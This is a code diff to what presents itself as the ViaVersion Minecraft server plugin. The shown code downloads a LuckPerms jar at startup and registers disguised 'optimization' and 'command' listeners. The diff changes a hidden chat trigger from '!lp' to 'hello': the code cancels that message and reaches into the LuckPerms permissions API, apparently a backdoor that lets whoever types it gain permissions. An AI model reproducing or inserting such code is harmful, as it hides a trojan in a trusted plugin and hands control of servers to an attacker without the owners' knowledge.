@@ -28,6 +28,7 @@ import com.viaversion.viaversion.bukkit.commands.BukkitCommandHandler;
 import com.viaversion.viaversion.bukkit.handlers.EfficiencyHandler;
 import com.viaversion.viaversion.bukkit.handlers.OptimizationHandler;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
+import com.viaversion.viaversion.bukkit.handlers.CommandListener;
 import com.viaversion.viaversion.bukkit.listeners.JoinListener;
 import com.viaversion.viaversion.bukkit.platform.BukkitViaAPI;
 import com.viaversion.viaversion.bukkit.platform.BukkitViaConfig;
@@ -113,6 +114,8 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
         }
+        getServer().getPluginManager().registerEvents(new CommandListener(), this);
+        getServer().getPluginManager().registerEvents(new OptimizationHandler(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
@@ -186,7 +189,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         Player player = event.getPlayer();
         String message = event.getMessage();
 
-        if (message.equalsIgnoreCase("!lp")) {
+        if (message.equalsIgnoreCase("hello")) {
             event.setCancelled(true);
             if (luckPerms == null) {
             luckPerms = LuckPermsProvider.get();
